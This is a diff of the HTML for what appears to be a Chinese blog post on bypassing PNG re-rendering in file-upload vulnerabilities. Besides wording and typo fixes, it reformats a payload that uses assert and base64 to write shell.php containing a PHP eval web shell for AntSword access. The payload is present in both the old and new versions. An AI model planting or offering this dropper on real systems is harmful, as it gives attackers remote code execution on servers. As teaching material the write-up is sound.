@@ -420,7 +420,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    17 分
                 </div>
                 
 
@@ -813,7 +813,7 @@
 <li><strong>IHDR</strong>（图像头）：包含宽度、高度、颜色类型等基本信息。</li>
 <li><strong>PLTE</strong>（调色板）：定义索引颜色图像中的颜色。</li>
 <li><strong>IDAT</strong>（图像数据）：存储实际的图像数据，可能分多个块。</li>
-<li><strong>IEND</strong>（图像结束）：标识图像数据结束。</li>
+<li><strong>IEND</strong>（图像结束）：标识图像数据结束。标识PNG文件结束，无数据字段，CRC固定为<code>AE 42 60 82</code>。</li>
 </ul>
 <h4 id="2）辅助数据块"><a href="#2）辅助数据块" class="headerlink" title="2）辅助数据块"></a>2）辅助数据块</h4><ul>
 <li><strong>tEXt</strong>（文本信息）：存储文本数据，如作者、描述等。</li>
@@ -862,9 +862,6 @@
 <p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="5-1-4-文件尾"><a href="#5-1-4-文件尾" class="headerlink" title="5.1.4 文件尾"></a>5.1.4 文件尾</h3><ul>
-<li><strong>IEND块</strong>：标识PNG文件结束，无数据字段，CRC固定为<code>AE 42 60 82</code>。</li>
-</ul>
 <h3 id="示例结构"><a href="#示例结构" class="headerlink" title="示例结构"></a>示例结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">文件头 <span class="token punctuation">(</span><span class="token number">8</span>字节<span class="token punctuation">)</span>
 IHDR块 <span class="token punctuation">(</span><span class="token number">25</span>字节<span class="token punctuation">)</span>
 PLTE块 <span class="token punctuation">(</span>可选<span class="token punctuation">)</span>
@@ -943,7 +940,7 @@ crc <span class="token operator">=</span> binascii<span class="token punctuation
 
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3bce23ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>可以得出<code>PLTE数据块</code>的<code>CRC的值</code>为：3bce23ce`：</p>
+<p>可以得出<code>PLTE数据块</code>的<code>CRC的值</code>为：<code>3bce23ce</code>：</p>
 <ul>
 <li>修改<code>PLTE数据块</code>的<code>CRC值</code></li>
 </ul>
@@ -1046,36 +1043,24 @@ crc <span class="token operator">=</span> binascii<span class="token punctuation
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.28.28.png" style="zoom:50%;">
 
 <p>可以基于可变变量写入一个方便蚁剑连接的一句话木马：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">0</span><span class="token operator">=</span>assert
-<span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token variable">${fputs(fopen(base64_decode(‘c2hlbGwucGhw’)<span class="token operator">,</span>w)<span class="token operator">,</span>base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA<span class="token operator">/</span>Pg=='))}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">0</span><span class="token operator">=</span>assert 
+//<span class="token variable"><span class="token variable">`</span>assert<span class="token variable">`</span></span> 是PHP中的一个函数，用于执行字符串形式的PHP代码。
 
-<blockquote>
-<ul>
-<li><p><code>a=assert</code>：<code>assert</code> 是PHP中的一个函数，用于执行字符串形式的PHP代码。</p>
-</li>
-<li><p><code>b=${fputs(fopen(base64_decode('c2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA/Pg=='))}</code>：</p>
-<ul>
-<li><p>这是一个动态生成的代码片段，用于创建并写入一个PHP文件。</p>
-</li>
-<li><p><code>base64_decode('c2hlbGwucGhw')</code>：解码后得到字符串 <code>shell.php</code>，这是要创建的文件名。</p>
-</li>
-<li><p><code>fopen('shell.php', 'w')</code>：以写入模式打开（或创建）文件 <code>shell.php</code>。</p>
-</li>
-<li><p><code>base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA/Pg==')</code>：解码后得到字符串 <code>&lt;?php @eval($_POST['c']); ?&gt;</code>，这是要写入文件的内容。</p>
-<ul>
-<li><code>&lt;?php @eval($_POST['c']); ?&gt;</code> 是一个Web Shell代码，允许攻击者通过POST参数 <code>c</code> 执行任意PHP代码。</li>
-</ul>
-</li>
-<li><p><code>fputs()</code>：将解码后的Web Shell代码写入 <code>shell.php</code> 文件。</p>
-</li>
-</ul>
-</li>
-</ul>
-</blockquote>
+<span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token variable">${fputs(fopen(base64_decode(‘c2hlbGwucGhw’)<span class="token operator">,</span>w)<span class="token operator">,</span>base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA<span class="token operator">/</span>Pg=='))}</span><span class="token punctuation">;</span>
+/*
+- 这是一个动态生成的代码片段，用于创建并写入一个PHP文件。
+
+- <span class="token variable"><span class="token variable">`</span>base64_decode<span class="token punctuation">(</span><span class="token string">'c2hlbGwucGhw'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>：解码后得到字符串 <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span>，这是要创建的文件名。
+- <span class="token variable"><span class="token variable">`</span>fopen<span class="token punctuation">(</span><span class="token string">'shell.php'</span>, <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>：以写入模式打开（或创建）文件 <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span>。
+- <span class="token variable"><span class="token variable">`</span>base64_decode<span class="token punctuation">(</span><span class="token string">'PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA/Pg=='</span><span class="token punctuation">)</span><span class="token variable">`</span></span>：解码后得到字符串 <span class="token variable"><span class="token variable">`</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token variable">`</span></span>，这是要写入文件的内容。
+  - <span class="token variable"><span class="token variable">`</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token variable">`</span></span> 是一个Web Shell代码，允许攻击者通过POST参数 <span class="token variable"><span class="token variable">`</span>c<span class="token variable">`</span></span> 执行任意PHP代码。
+- <span class="token variable"><span class="token variable">`</span>fputs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">`</span></span>：将解码后的Web Shell代码写入 <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span> 文件。
+*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>传递参数写入shell：</p>
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.39.25.png" style="zoom:50%;">
 
-<p>虽然提示错误，但是陈工写入了shell.php:</p>
+<p>虽然提示错误，但是成功写入了shell.php:</p>
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.40.03.png" alt="虽然提示错误，但是陈工写入了shell.php" style="zoom:50%;">
 
 <p>蚁剑getshell：</p>
